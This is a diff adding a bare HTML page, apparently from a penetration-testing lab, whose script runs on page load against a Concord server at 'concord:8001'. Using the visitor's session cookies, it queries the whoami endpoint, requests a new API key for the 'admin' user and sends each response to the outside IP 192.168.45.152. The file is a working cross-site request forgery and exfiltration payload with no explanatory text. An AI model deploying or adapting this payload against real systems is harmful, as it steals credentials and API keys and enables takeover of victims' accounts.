@@ -1,0 +1,35 @@
+<html>
+  <head>
+    <script>
+			function rce() {
+        fetch("http://concord:8001/api/v1/apikey", {
+          method: "POST",
+          credentials: "include",
+          headers: {"content-type":"application/json"},
+          body: JSON.stringify({"username":"admin"})
+        })
+        .then(res => res.text())
+        .then(data => {
+          fetch("http://192.168.45.152/?msg=" + data)
+        }).catch(err => {
+          fetch("http://192.168.45.152/?err=" + err)
+        });
+      }
+
+      fetch("http://concord:8001/api/service/console/whoami", {
+        credentials: "include"
+      })
+      .then(async (res) => {
+        if (res.status != 401) {
+          const data = await res.text();
+          fetch("http://192.168.45.152/?msg=" + data)
+          rce();
+        } else {
+          fetch("http://192.168.45.152/?msg=userNotLoggedIn")
+        }
+      })
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
